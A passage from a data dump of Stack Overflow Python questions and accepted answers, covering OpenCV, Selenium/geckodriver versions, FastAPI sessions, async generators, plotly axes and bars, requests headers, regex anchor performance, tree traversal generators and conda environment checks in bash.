<pre><code>Segmentation fault (core dumped)
</code></pre>
","70567354","<p>Solved downgrading to the nov 2021 version of opencv</p>
<pre><code>pip install opencv-python-headless==4.5.4.60
</code></pre>
"
"70821737","1","WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64 error using Selenium Geckodriver Firefox in FreeBSD jail","<p>For some tests, I've set up a plain new TrueNAS 12.3 FreeBSD Jail and started it, then installed <code>python3</code>, <code>firefox</code>, <code>geckodriver</code> and <code>pip</code> using the following commands:</p>
<pre><code>pkg install python3 firefox geckodriver py38-pip
pip install --upgrade pip
setenv CRYPTOGRAPHY_DONT_BUILD_RUST 1
pip install cryptography==3.4.7
pip install selenium
</code></pre>
<p>Afterwards, when I want to use Selenium with Firefox in my Python code, it does not work:</p>
<pre><code>from selenium import webdriver
from selenium.webdriver.firefox.options import Options
options = Options()
options.headless = True
driver = webdriver.Firefox(options=options)
</code></pre>
<p>it brings</p>
<pre><code>Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/usr/local/lib/python3.8/site-packages/selenium/webdriver/firefox/webdriver.py&quot;, line 174, in __init__
    self.service.start()
  File &quot;/usr/local/lib/python3.8/site-packages/selenium/webdriver/common/service.py&quot;, line 98, in start
    self.assert_process_still_running()
  File &quot;/usr/local/lib/python3.8/site-packages/selenium/webdriver/common/service.py&quot;, line 110, in assert_process_still_running
    raise WebDriverException(
selenium.common.exceptions.WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64
</code></pre>
<p>Funnily, on another Jail that I've set up approximately a year ago (approximately in the mentioned way as well), it just works and does not throw the error (so different versions maybe?)!</p>
<p>This is the only content of <code>geckodriver.log</code>:</p>
<pre><code>geckodriver: error: Found argument '--websocket-port' which wasn't expected, orisn't valid in this context

USAGE:
    geckodriver [FLAGS] [OPTIONS]

For more information try --help
</code></pre>
<p>Is there anything I could try to get it working? I've already seen <a href=""https://stackoverflow.com/q/39163331/4249849"">this question</a>, but it seems fairly outdated.</p>
<p>Firefox 95.0.2, geckodriver 0.26.0, Python 3.8.12, Selenium 4.1.0</p>
","70822145","<p>This error message...</p>
<pre><code>selenium.common.exceptions.WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64
</code></pre>
<p>and the <a href=""https://stackoverflow.com/questions/45510338/selenium-webdriver-3-4-0-geckodriver-0-18-0-firefox-which-combination-w/45510453#45510453""><em>GeckoDriver</em></a> log...</p>
<pre><code>geckodriver: error: Found argument '--websocket-port' which wasn't expected, orisn't valid in this context
</code></pre>
<p>...implies that the <a href=""https://stackoverflow.com/questions/45329528/which-firefox-browser-versions-supported-for-given-geckodriver-version/45331403#45331403"">GeckoDriver</a> was unable to initiate/spawn a new <em>Browsing Context</em> i.e. <a href=""/questions/tagged/firefox"" class=""post-tag"" title=""show questions tagged &#39;firefox&#39;"" rel=""tag"">firefox</a> session.</p>
<hr />
<p>Your main issue is the <strong>incompatibility</strong> between the version of the binaries you are using as follows:</p>
<ul>
<li>Your <em>Selenium Client</em> version is <em><strong>4.1.0</strong></em>.</li>
<li>But your <em>GeckoDriver</em> version is <em><strong>0.26.0</strong></em>.</li>
</ul>
<p>As <em><code>@ernstki</code></em> mentions in their <a href=""https://github.com/mozilla/geckodriver/issues/1959#issuecomment-1002382891"" rel=""noreferrer"">comment</a>:</p>
<blockquote>
<p>You are running a geckodriver older than 0.30.0, and it is missing the <code>--websocket-port</code> option, which newer/new-ish versions of Selenium seem to depend on.</p>
</blockquote>
<p>To put it in simple words, till the previous <a href=""https://stackoverflow.com/questions/47073748/which-firefox-version-is-compatible-with-selenium-3-6-0/47095220#47095220"">GeckoDriver</a> release of <em><strong>v0.29.0</strong></em> the <code>--websocket-port</code> option wasn't in use, which is now mandatory with <em><strong>Selenium v4.0.1</strong></em>.</p>
<p>Further <code>@whimboo</code> also confirmed in his <a href=""https://github.com/mozilla/geckodriver/issues/1959#issuecomment-1003917216"" rel=""noreferrer"">comment</a>:</p>
<blockquote>
<p>As it has been manifested the problem here is not geckodriver but Selenium. As such you should create an issue on the Selenium repository instead, so that an option could be added to not always pass the --websocket-port argument. If that request gets denied you will have to use older releases of Selenium if testing with older geckodriver releases is really needed.</p>
</blockquote>
<hr />
<h2>Solution</h2>
<p>Ensure that:</p>
<ul>
<li><em>Selenium</em> is upgraded to current levels <a href=""https://www.selenium.dev/downloads/"" rel=""noreferrer"">Version 4.1.0</a>.</li>
<li><em>GeckoDriver</em> is upgraded to <a href=""https://github.com/mozilla/geckodriver/releases"" rel=""noreferrer"">GeckoDriver v0.30.0</a> level.</li>
<li><em>Firefox</em> is upgraded to current <em>Firefox v96.0.2</em> levels.</li>
</ul>
<hr />
<h2>FreeBSD versions</h2>
<p>Incase you are using FreeBSD versions where the <em>GeckoDriver</em> versions are older, in those cases you have to downgrade <em>Selenium</em> to <em><strong>v3.x</strong></em> levels.</p>
<p>Commands (<a href=""https://stackoverflow.com/questions/70821737/webdriverexception-message-service-geckodriver-unexpectedly-exited-status-cod/70822145?noredirect=1#comment125203512_70822145""><strong>courtesy: Kurtibert</strong></a>):</p>
<ul>
<li><p>Uninstall <em>Selenium</em>:</p>
<pre><code>pip3 uninstall selenium;
</code></pre>
</li>
<li><p>Install <em>Selenium</em>:</p>
<pre><code>pip3 install 'selenium&lt;4.0.0'
</code></pre>
</li>
</ul>
"
"70596809","1","Can a class attribute shadow a built-in in Python?","<p>If have some code like this:</p>
<pre class=""lang-py prettyprint-override""><code>class Foo():
   def open(self, bar):
       # Doing some fancy stuff here, i.e. opening &quot;bar&quot;
       pass
</code></pre>
<p>When I run <a href=""https://flake8.pycqa.org/"" rel=""noreferrer""><code>flake8</code></a> with the <a href=""https://pypi.org/project/flake8-builtins/"" rel=""noreferrer"">flake8-builtins</a> plug-in I get the error</p>
<pre><code>A003 class attribute &quot;open&quot; is shadowing a python builtin
</code></pre>
<p>I don't understand how the method could possibly shadow the built-in<code> open</code>-function, because the method can only be called using an instance (i.e. <code>self.open(&quot;&quot;)</code> or <code>someFoo.open(&quot;&quot;)</code>). Is there some other way code expecting to call the built-in ends up calling the method? Or is this a false positive of the <code>flake8-builtins</code> plug-in?</p>
","70597023","<p>Not really a practical case, but your code would fail if you wanted to use the built-it functions on the class level after your shadowed function has been initialized:</p>
<pre><code>class Foo:
    def open(self, bar):
        pass

    with open('myfile.txt'):
        print('did I get here?')

&gt;&gt;&gt; TypeError: open() missing 1 required positional argument: 'bar'
</code></pre>
<p>The same would also be true with other built-in functions, such as <code>print</code></p>
<pre><code>class Foo:
    def print(self, bar):
        pass

    print('did I get here?')

&gt;&gt;&gt; TypeError: print() missing 1 required positional argument: 'bar'
</code></pre>
"
"70617258","1","session object in Fastapi similar to flask","<p>I am trying to use session to pass variables across view functions in fastapi. However, I do not find any doc which specifically says of about session object. Everywhere I see, cookies are used. Is there any way to convert the below flask code in fastapi? I want to keep session implementation as simple as possible.</p>
<pre><code>from flask import Flask, session, render_template, request, redirect, url_for


app=Flask(__name__)
app.secret_key='asdsdfsdfs13sdf_df%&amp;'   

@app.route('/a')
def a():
    session['my_var'] = '1234'              
    return redirect(url_for('b'))          


@app.route('/b')
def b():
    my_var = session.get('my_var', None)
    return my_var    


if __name__=='__main__':
    app.run(host='0.0.0.0', port=5000, debug = True)
</code></pre>
","70630483","<p>Take a look at Starlette's <code>SessionMiddleware</code>. FastAPI uses Starlette under the hood so it is compatible.</p>
<p>After you register <code>SessionMiddleware</code>, you can access <code>Request.session</code>, which is a dictionary.</p>
<p>Documentation: <a href=""https://www.starlette.io/middleware/#sessionmiddleware"" rel=""noreferrer"">SessionMiddleware</a></p>
<p>An implementation in FastAPI may look like:</p>
<pre class=""lang-py prettyprint-override""><code>@app.route(&quot;/a&quot;)
async def a(request: Request) -&gt; RedirectResponse:

    request.session[&quot;my_var&quot;] = &quot;1234&quot;

    return RedirectResponse(&quot;/b&quot;)

@app.route(&quot;/b&quot;)
async def b(request: Request) -&gt; PlainTextResponse:

    my_var = request.session.get(&quot;my_var&quot;, None)

    return PlainTextResponse(my_var)
</code></pre>
"
"70876394","1","async_generator' object is not iterable","<p>I need to return a value in async function.
I tried to use synchronous form of return:</p>
<pre><code>import asyncio

async def main():
    for i in range(10):
        return i
        await asyncio.sleep(1)

print(asyncio.run(main()))
</code></pre>
<p>output:</p>
<p><code>0 [Finished in 204ms]</code></p>
<p>But it just return value of the first loop, which is not expexted. So changed the code as below:</p>
<pre><code>import asyncio

async def main():
    for i in range(10):
        yield i
        await asyncio.sleep(1)

for _ in main():
    print(_)
</code></pre>
<p>output:</p>
<p><code>TypeError: 'async_generator' object is not iterable</code></p>
<p>by using async generator I am facing with this error. How can I return a value for every loop of async function?</p>
<p>Thanks</p>
","70876749","<p>You need to use an <code>async for</code> which itself needs to be inside an <code>async</code> function:</p>
<pre class=""lang-py prettyprint-override""><code>async def get_result():
    async for i in main():
        print(i)

asyncio.run(get_result())
</code></pre>
"
"70587271","1","Is there a Pythonic way of filtering substrings of strings in a list?","<p>I have a list with strings as below.</p>
<pre class=""lang-py prettyprint-override""><code>candidates = [&quot;Hello&quot;, &quot;World&quot;, &quot;HelloWorld&quot;, &quot;Foo&quot;, &quot;bar&quot;, &quot;ar&quot;]
</code></pre>
<p>And I want the list to be filtered as <code>[&quot;HelloWorld&quot;, &quot;Foo&quot;, &quot;Bar&quot;]</code>, because others are substrings. I can do it like this, but don't think it's fast or elegant.</p>
<pre class=""lang-py prettyprint-override""><code>def filter_not_substring(candidates):
    survive = []
    for a in candidates:
        for b in candidates:
            if a == b:
                continue
            if a in b:
                break
        else:
            survive.append(a)
    return survive
</code></pre>
<p>Is there any fast way to do it?</p>
","70587308","<p>How about:</p>
<pre><code>candidates = [&quot;Hello&quot;, &quot;World&quot;, &quot;HelloWorld&quot;, &quot;Foo&quot;, &quot;bar&quot;, &quot;ar&quot;]
result = [c for c in candidates if not any(c in o and len(o) &gt; len(c) for o in candidates)]
print(result)
</code></pre>
<p>Counter to what was suggested in the comments:</p>
<pre><code>from timeit import timeit


def filter_not_substring(candidates):
    survive = []
    for a in candidates:
        for b in candidates:
            if a == b:
                continue
            if a in b:
                break
        else:
            survive.append(a)
    return survive


def filter_not_substring2a(candidates):
    return [c for c in candidates if not any(len(o) &gt; len(c) and c in o for o in candidates)]


def filter_not_substring2b(candidates):
    return [c for c in candidates if not any(c in o and len(o) &gt; len(c) for o in candidates)]


xs = [&quot;Hello&quot;, &quot;World&quot;, &quot;HelloWorld&quot;, &quot;Foo&quot;, &quot;bar&quot;, &quot;ar&quot;, &quot;bar&quot;]
print(filter_not_substring(xs), filter_not_substring2a(xs), filter_not_substring2b(xs))
print(timeit(lambda: filter_not_substring(xs)))
print(timeit(lambda: filter_not_substring2a(xs)))
print(timeit(lambda: filter_not_substring2b(xs)))
</code></pre>
<p>Result:</p>
<pre class=""lang-none prettyprint-override""><code>['HelloWorld', 'Foo', 'bar', 'bar'] ['HelloWorld', 'Foo', 'bar', 'bar'] ['HelloWorld', 'Foo', 'bar', 'bar']
1.5163685
4.6516653
3.8334089999999996
</code></pre>
<p>So, OP's solution is substantially faster, but <code>filter_not_substring2b</code> is still about 20% faster than <code>2a</code>. So, putting the <code>len</code> comparison first doesn't save time.</p>
<p>For any production scenario, OP's function is probably optimal - a way to speed it up might be to bring the whole problem into C, but I doubt that would show great gains, since the logic is pretty straightforward already and I'd expect Python to do a fairly good job of it as well.</p>
<p>User @ming noted that OP's solution can be improved a bit:</p>
<pre><code>def filter_not_substring_b(candidates):
    survive = []
    for a in candidates:
        for b in candidates:
            if a in b and a != b:
                break
        else:
            survive.append(a)
    return survive
</code></pre>
<p>This version of the function is somewhat faster, for me about 10-15%</p>
<p>Finally, note that this is only <em>just</em> faster than <code>2b</code>, even though it is very similar to the optimised solution by @ming, but almost 3x slower than their solution. It's unclear to me why that would be - if anyone has fairly certain thoughts on that, please share in the comments:</p>
<pre><code>def filter_not_substring_c(candidates):
    return [a for a in candidates if all(a not in b or a == b for b in candidates)]
</code></pre>
"
"70916649","1","How to change the x-axis and y-axis labels in plotly?","<p>How can I change the x and y-axis labels in plotly because in matplotlib, I can simply use <strong>plt.xlabel</strong> but I am unable to do that in plotly.</p>
<p>By using this code in a dataframe:</p>
<pre><code>Date = df[df.Country==&quot;India&quot;].Date
New_cases = df[df.Country==&quot;India&quot;]['7day_rolling_avg']

px.line(df,x=Date, y=New_cases, title=&quot;India Daily New Covid Cases&quot;)
</code></pre>
<p>I get this output:</p>
<p><a href=""https://i.stack.imgur.com/AM4An.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/AM4An.png"" alt=""I get this output:"" /></a></p>
<p>In this <strong>X</strong> and <strong>Y</strong> axis are labeled as <strong>X</strong> and <strong>Y</strong> how can I change the name of <strong>X</strong> and <strong>Y</strong> axis to &quot;Date&quot; and &quot;Cases&quot;</p>
","70916879","<ul>
<li>simple case of setting axis <strong>title</strong></li>
</ul>
<pre><code>update_layout(
    xaxis_title=&quot;Date&quot;, yaxis_title=&quot;7 day avg&quot;
)
</code></pre>
<h3>full code as MWE</h3>
<pre><code>import pandas as pd
import io, requests

df = pd.read_csv(
    io.StringIO(
        requests.get(
            &quot;https://raw.githubusercontent.com/owid/covid-19-data/master/public/data/vaccinations/vaccinations.csv&quot;
        ).text
    )
)
df[&quot;Date&quot;] = pd.to_datetime(df[&quot;date&quot;])
df[&quot;Country&quot;] = df[&quot;location&quot;]
df[&quot;7day_rolling_avg&quot;] = df[&quot;daily_people_vaccinated_per_hundred&quot;]

Date = df[df.Country == &quot;India&quot;].Date
New_cases = df[df.Country == &quot;India&quot;][&quot;7day_rolling_avg&quot;]

px.line(df, x=Date, y=New_cases, title=&quot;India Daily New Covid Cases&quot;).update_layout(
    xaxis_title=&quot;Date&quot;, yaxis_title=&quot;7 day avg&quot;
)
</code></pre>
<p><a href=""https://i.stack.imgur.com/5h3yQ.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/5h3yQ.png"" alt=""enter image description here"" /></a></p>
"
"70923969","1","how to remove the ""User-Agent"" header when send request in python","<p>I'm using <a href=""https://docs.python-requests.org/en/latest/"" rel=""noreferrer"">python requests</a> library, I need send a request without a user-agent header.
I found <a href=""https://stackoverflow.com/questions/32954366/python3-urllib2-need-to-remove-the-user-agent-header-completely"">this question</a>, but it's for Urllib2.</p>
<p>I'm trying to simulate an Android app which does this when calling a private API.</p>
<p>I try to set <code>User-Agent</code> to <code>None</code> as in the following code, but it doesn't work. It still sends <code>User-Agent: python-requests/2.27.1</code>.</p>
<p>Is there any way?</p>
<pre><code>headers = requests.utils.default_headers()
headers['User-Agent'] = None
requests.post(url, *args, headers=headers, **kwargs)
</code></pre>
","70924222","<p>The <a href=""https://docs.python-requests.org/en/latest/"" rel=""noreferrer"">requests</a> library is <a href=""https://stackoverflow.com/a/54698280/8153147"">built on top</a> of the <a href=""https://urllib3.readthedocs.io/en/stable/"" rel=""noreferrer"">urllib3</a> library.  So, when you pass <code>None</code> <code>User-Agent</code> header to the requests's <code>post</code> method, the <code>urllib3</code> set their own default <code>User-Agent</code></p>
<pre><code>import requests

r = requests.post(&quot;https://httpbin.org/post&quot;, headers={
    &quot;User-Agent&quot;: None,
})

print(r.json()[&quot;headers&quot;][&quot;User-Agent&quot;])
</code></pre>
<p>Output</p>
<pre><code>python-urllib3/1.26.7
</code></pre>
<p>Here the urllib3 source of <code>connection.py</code></p>
<pre><code>class HTTPConnection(_HTTPConnection, object):
    ...

    def request(self, method, url, body=None, headers=None):
        if headers is None:
            headers = {}
        else:
            # Avoid modifying the headers passed into .request()
            headers = headers.copy()
        if &quot;user-agent&quot; not in (six.ensure_str(k.lower()) for k in headers):
            headers[&quot;User-Agent&quot;] = _get_default_user_agent()
        super(HTTPConnection, self).request(method, url, body=body, headers=headers) 
</code></pre>
<p>So, you can monkey patch it to disable default <code>User-Agent</code> header</p>
<pre><code>import requests
from urllib3 import connection


def request(self, method, url, body=None, headers=None):
    if headers is None:
        headers = {}
    else:
        # Avoid modifying the headers passed into .request()
        headers = headers.copy()
    super(connection.HTTPConnection, self).request(method, url, body=body, headers=headers)

connection.HTTPConnection.request = request


r = requests.post(&quot;https://httpbin.org/post&quot;, headers={
    &quot;User-Agent&quot;: None,
})

print(r.json()[&quot;headers&quot;])
</code></pre>
<p>Output</p>
<pre><code>{
'Accept': '*/*', 
'Accept-Encoding': 'gzip, deflate', 
'Content-Length': '0', 
'Host': 'httpbin.org', 
'X-Amzn-Trace-Id': 'Root=1-61f7b53b-26c4c8f6498c86a24ff05940'
}
</code></pre>
<p>Also, consider to provide browser-like <code>User-Agent</code> like this <code>Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36</code>. Maybe it solves your task with less effort</p>
"
"70927513","1","Replacing whole string is faster than replacing only its first character","<p>I tried to replace a character <code>a</code> by <code>b</code> in a given large string. I did an experiment - first I replaced it in the whole string, then I replaced it only at its beginning.</p>
<pre class=""lang-py prettyprint-override""><code>import re
# pattern = re.compile('a')
pattern = re.compile('^a')
string = 'x' * 100000

pattern.sub('b', string)
</code></pre>
<p>I expected that replacing the beginning would have to be much faster then replacing the whole string because you have to check only 1 position instead of 100000. I did some measuring:</p>
<pre><code>python -m timeit --setup &quot;import re; p=re.compile('a'); string='x'*100000&quot; &quot;p.sub('b', string)&quot;
10000 loops, best of 3: 19.1 usec per loop
</code></pre>
<pre><code>python -m timeit --setup &quot;import re; p=re.compile('^a'); string='x'*100000&quot; &quot;p.sub('b', string)&quot;
1000 loops, best of 3: 613 usec per loop
</code></pre>
<p>The results show that, on the contrary, trying to replace the whole string is about 30x faster. Would you expect such result? Can you explain that?</p>
","70928164","<p>The functions provided in the Python <code>re</code> module do not optimize based on anchors. In particular, functions that try to apply a regex at every position - <code>.search</code>, <code>.sub</code>, <code>.findall</code> etc. - will do so even when the regex can only possibly match at the beginning. I.e., even without multi-line mode specified, such that <code>^</code> can only match at the beginning of the string, the call is not re-routed internally. Thus:</p>
<pre class=""lang-sh prettyprint-override""><code>$ # .match only looks at the first position regardless
$ python -m timeit --setup &quot;import re; p=re.compile('a'); string='x'*100000&quot; &quot;p.match(string)&quot;
2000000 loops, best of 5: 155 nsec per loop
$ python -m timeit --setup &quot;import re; p=re.compile('^a'); string='x'*100000&quot; &quot;p.match(string)&quot;
2000000 loops, best of 5: 157 nsec per loop
$ # .search looks at every position, even if there is an anchor
$ python -m timeit --setup &quot;import re; p=re.compile('a'); string='x'*100000&quot; &quot;p.search(string)&quot;
10000 loops, best of 5: 22.4 usec per loop
$ # and the anchor only adds complexity to the matching process
$ python -m timeit --setup &quot;import re; p=re.compile('^a'); string='x'*100000&quot; &quot;p.search(string)&quot;
500 loops, best of 5: 746 usec per loop
</code></pre>
<p>While <code>re</code> does not optimize for anchors, it <em>does</em> optimize for several other things that could occur at the start of a pattern. One of those optimizations is for a pattern <a href=""https://github.com/python/cpython/blob/v3.10.2/Modules/sre_lib.h#L1422"" rel=""nofollow noreferrer"">starting with a single constant character</a>:</p>
<pre class=""lang-c prettyprint-override""><code>    if (prefix_len == 1) {
        /* pattern starts with a literal character */
        SRE_CHAR c = (SRE_CHAR) prefix[0];
#if SIZEOF_SRE_CHAR &lt; 4
        if ((SRE_CODE) c != prefix[0])
            return 0; /* literal can't match: doesn't fit in char width */
#endif
        end = (SRE_CHAR *)state-&gt;end;
        state-&gt;must_advance = 0;
        while (ptr &lt; end) {
            while (*ptr != c) {
                if (++ptr &gt;= end)
                    return 0;
            }
            ...
</code></pre>
<p>This optimization performs a simple character comparison to skip candidate matches that don't start with the required character, instead of invoking the full match engine. This optimization is why the unanchored regex was so much faster - there are 3 separate optimizations like this in the code, one for a single constant character, one for a multi-character constant prefix, and one for a character class, but nothing for a <code>^</code> anchor.</p>
<p>I think a reasonable case can be made to file a bug report against this - not having such an obvious optimization implemented clearly violates expectations. Aside from which, while it's easy to replace <code>.search</code> with an anchor using <code>.match</code>, it's not so straightforward to replace <code>.sub</code> with an anchor - you have to <code>.match</code>, check the result, and then call <code>.replace</code> on the string yourself.</p>
<p>If you need to anchor to the <em>end</em> of the string <em>and not</em> the start, it gets much more difficult; I recall ancient Perl advice to try reversing the string first, but it's hard in general to write a pattern that matches the reverse of what you want.</p>
"
"70586483","1","Returning Array from Recursive Binary Tree Search","<p>Hi I've made a simple Binary Tree and added a pre-order traversal method. After throwing around some ideas I got stuck on finding a way to return each value from the <code>traverse_pre()</code> method in an array.</p>
<pre><code>class BST:
    def __init__(self, val):
        self.value = val
        self.left = None
        self.right = None

    def add_child(self, val):
        if self.value:
            if val &lt; self.value:
                if self.left == None:
                    self.left = BST(val)
                else:
                    self.left.add_child(val)
            else:
                if val &gt; self.value:
                    if self.right == None:
                        self.right = BST(val)
                    else:
                        self.right.add_child(val)
        else:
            self.value = val

    def traverse_pre(self):
        if self.left:
            self.left.traverse_pre()
        print(self.value)

        if self.right:
            self.right.traverse_pre()


Tree = BST(5)
Tree.add_child(10)
Tree.add_child(8)
Tree.add_child(2)
Tree.add_child(4)
Tree.add_child(7)

Tree.traverse_pre()
</code></pre>
<p>How would I modify the <code>traverse_pre()</code> function to return an array consisting of the node values. Is there a good example of this process for me to understand this further, I'm a bit stuck on how values can be appended to an array within recursion.</p>
","70587563","<p>I would not recommend copying the entire tree to an intermediate list using  <code>.append</code> or <code>.extend</code>. Instead use <code>yield</code> which makes your tree iterable and capable of working directly with many built-in Python functions -</p>
<pre class=""lang-py prettyprint-override""><code>class BST:
    # ...
    def preorder(self):
        # value
        yield self.value
        # left
        if self.left: yield from self.left.preorder()
        # right
        if self.right: yield from self.right.preorder()
</code></pre>
<p>We can simply reorder the lines this to offer different traversals like <code>inorder</code> -</p>
<pre class=""lang-py prettyprint-override""><code>class BST:
    # ...
    def inorder(self):
        # left
        if self.left: yield from self.left.inorder()
        # value
        yield self.value
        # right
        if self.right: yield from self.right.inorder()
</code></pre>
<p>And <code>postorder</code> -</p>
<pre class=""lang-py prettyprint-override""><code>class BST:
    # ...
    def postorder(self):
        # left
        if self.left: yield from self.left.postorder()
        # right
        if self.right: yield from self.right.postorder()
        # value
        yield self.value
</code></pre>
<p>Usage of generators provides inversion of control. Rather than the traversal function deciding what happens to each node, the the caller is left with the decision on what to do. If a list is indeed the desired target, simply use <code>list</code> -</p>
<pre class=""lang-py prettyprint-override""><code>list(mytree.preorder())
</code></pre>
<pre class=""lang-py prettyprint-override""><code># =&gt; [ ... ]
</code></pre>
<p>That said, there's room for improvement with the rest of your code. There's no need to mutate nodes and tangle <code>self</code> context and recursive methods within your <code>BST</code> class directly. A functional approach with a thin <code>class</code> wrapper will make it easier for you to grow the functionality of your tree. For more information on this technique, see <a href=""https://stackoverflow.com/a/66340109/633183"">this related Q&amp;A</a>.</p>
<p>If you need to facilitate trees of significant size, a different traversal technique may be required. Just ask in the comments and someone can help you find what you are looking for.</p>
"
"70597896","1","Check if conda env exists and create if not in bash","<p>I have a build script to run a simple python app. I am trying to set it up that it will run for any user that has conda installed and in their PATH. No other prerequisites. I have that pretty much accomplished but would like to make it more efficient for returning users.</p>
<p>build_run.sh</p>
<pre><code>conda init bash
conda env create --name RUN_ENV --file ../run_env.yml -q --force
conda activate RUN_ENV
python run_app.py
conda deactivate
</code></pre>
<p>I would like to make it that the script checks if RUN_ENV already exists and activates it instead of forcing its creation every time. I tried</p>
<pre><code>ENVS=$(conda env list | awk '{print }' )
if [[ conda env list = *&quot;RUN_ENV&quot;* ]]; then
   conda activate RUN_ENV
else 
   conda env create --name RUN_ENV --file ../run_env.yml -q
   conda activate RUN_ENV
   exit
fi;
python run_app.py
conda deactivate
</code></pre>
<p>but it always came back as false and tried to create RUN_ENV</p>
","70598193","<p><strong>update 2022</strong></p>
<p>i've been receiving upvotes recently. so i'm going to bump up that this method overall is not natively &quot;conda&quot; and might not be the best approach. like i said originally, i do not use conda. take my advice at your discretion.</p>
<p>rather, please refer to <a href=""https://stackoverflow.com/questions/70597896/check-if-conda-env-exists-and-create-if-not-in-bash/70598193#comment124799776_70597896"">@merv's comment in the question</a> suggesting the use of the <code>--prefix</code> flag</p>
<p>additionally take a look at the <a href=""https://docs.conda.io/projects/conda/en/latest/commands/install.html#Target%20Environment%20Specification"" rel=""nofollow noreferrer"">documentation for further details</a></p>
<p>NOTE: you can always use a function within your bash script for repeated command invocations with very specific flags</p>
<p>e.g</p>
<pre class=""lang-bash prettyprint-override""><code>function PREFIXED_CONDA(){
   action=${1};
   # copy $1 to $action;
   shift 1;
   # delete first argument and shift remaining indeces to the left
   conda ${action} --prefix /path/to/project ${@}
}
</code></pre>
<hr />
<p>i am not sure how <code>conda env list</code> works (i don't use Anaconda); and your current <code>if</code>-tests are vague</p>
<p>but i'm going out on a limb and <em>guessing</em> this is what you're looking for</p>
<pre class=""lang-bash prettyprint-override""><code>#!/usr/bin/env bash
# ...
find_in_conda_env(){
    conda env list | grep &quot;${@}&quot; &gt;/dev/null 2&gt;/dev/null
}

if find_in_conda_env &quot;.*RUN_ENV.*&quot; ; then
   conda activate RUN_ENV
else 
# ...
</code></pre>
<p>instead of bringing it out into a separate function, you could also do</p>
<pre><code># ...
if conda env list | grep &quot;.*RUN_ENV.*&quot; &gt;/dev/null 2&gt;&amp;1; then
# ...
</code></pre>
<p>bonus points for neatness and clarity if you use <a href=""https://www.gnu.org/software/bash/manual/html_node/Command-Grouping.html"" rel=""nofollow noreferrer"">command grouping</a></p>
<pre><code># ...
if { conda env list | grep 'RUN_ENV'; } &gt;/dev/null 2&gt;&amp;1; then
# ...
</code></pre>
<p><code>if</code> simply checks the <a href=""https://www.shellscript.sh/exitcodes.html#:%7E:text=For%20example%2C%20GNU%20grep%20returns%200%20on%20success%2C%201%20if%20no%20matches%20were%20found%2C%20and%202%20for%20other%20errors"" rel=""nofollow noreferrer"">exit code</a>. and <code>grep</code> exits with <code>0</code> (success) as long as there's at least one match of the pattern provided; this evaluates to &quot;true&quot; in the <code>if</code> statement</p>
<p>(<code>grep</code> would match and succeed even if the pattern is just 'RUN_ENV' ;) )</p>
<hr />
<p>the <code>awk</code> portion of <code>ENVS=$(conda env list | awk '{print }' )</code> does virtually nothing. i would expect the output to be in tabular format, but <code>{print }</code> does no filtering, i believe you were looking for <code>{print $n}</code> where <code>n</code> is a column number or <code>awk /PATTERN/ {print}</code> where PATTERN is likely <code>RUN_ENV</code> and only lines which have PATTERN are printed.</p>
<p>but even so, storing a table in a string variable is going to be messing. you might want an <a href=""https://opensource.com/article/18/5/you-dont-know-bash-intro-bash-arrays"" rel=""nofollow noreferrer"">array</a>.</p>
<p>then coming to your <code>if</code>-condition, it's plain syntactically wrong.</p>
<ul>
<li>the <code>[[</code> construct is for comparing <em>values</em>: integer, string, regex</li>
<li>but here on the left of <code>=</code> we have a command <code>conda env list</code>
<ul>
<li>which i believe is also the contents of <code>$ENVS</code></li>
</ul>
</li>
<li>hence we can assume you meant <code>[[ &quot;${ENVS}&quot; == *&quot;RUN_ENV&quot;* ]]</code>
<ul>
<li>or alternately <code>[[ $(conda env list) == *&quot;RUN_ENV&quot;* ]]</code></li>
</ul>
</li>
<li>but still, regex matching against a table... not very intuitive imo</li>
<li>but it works... sort of</li>
<li>the proper clean syntax for regex matching is
<ul>
<li><code>[[ ${value} =~ /PATTERN/ ]]</code></li>
</ul>
</li>
</ul>
"
"70658955","1","How do I display bar plot for values that are zero in plotly?","<p>How do I make the bar appear when one of the value of y is zero? It just leaves a gap by default. Is there a way I can enable it to plot for zero values? I am able to see a line on the x-axis at <code>y=0</code> for the same if just plotted using <code>go.Box</code>. I would like to see this in the Bar plot as well.
So far, I set the base to zero. But that doesn't plot for y=0 either.
Here is my sample code. My actual code contains multiple traces, that's why I would like to see the plot for y=0
Here is the sample python code:</p>
<pre><code> import plotly.graph_objects as go
 fig = go.Figure()
 fig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2]))
 fig.show()
</code></pre>
","70659144","<p>Bar charts come with a line around the bars that by default are set to the same color as the background. In your case <code>'#E5ECF6'</code>. If you change that, the line will appear as a border around each bar that will remain visible even when <code>y = 0</code> for any given <code>x</code>.</p>
<pre><code>fig.update_traces(marker_line_color = 'blue', marker_line_width = 12)
</code></pre>
<p>If you set the line color to match that of the bar itself, you'll get this:</p>
<h3>Plot 1: Bars with identical fill and line colors</h3>
<p><a href=""https://i.stack.imgur.com/6YulJ.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/6YulJ.png"" alt=""enter image description here"" /></a></p>
<p>If I understand correctly, this should be pretty close to what you're trying to achieve. At least visually. I would perhaps consider adjusting the <code>yaxis range</code> a bit to make it a bit clearer that the y value displayed is in fact <code>0</code>.</p>
<h3>Plot 2: Adjusted y axis and separate colors</h3>
<p><a href=""https://i.stack.imgur.com/o9g8B.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/o9g8B.png"" alt=""enter image description here"" /></a></p>
<h3>Complete code for Plot 1:</h3>
<pre><code>import plotly.graph_objects as go
fig = go.Figure()
fig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2], marker_color = 'blue'))
fig.update_traces(marker_line_color = 'blue', marker_line_width = 12)
fig.show()
</code></pre>
<h3>Complete code for Plot 2:</h3>
<pre><code>import plotly.graph_objects as go
fig = go.Figure()
fig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2], marker_color =  '#00CC96'))
f = fig.full_figure_for_development(warn=False)
fig.update_traces(marker_line_color = '#636EFA', marker_line_width = 4)

fig.update_yaxes(range=[-1, 4])
fig.show()
</code></pre>
<hr />
<h3>Edit after comments</h3>
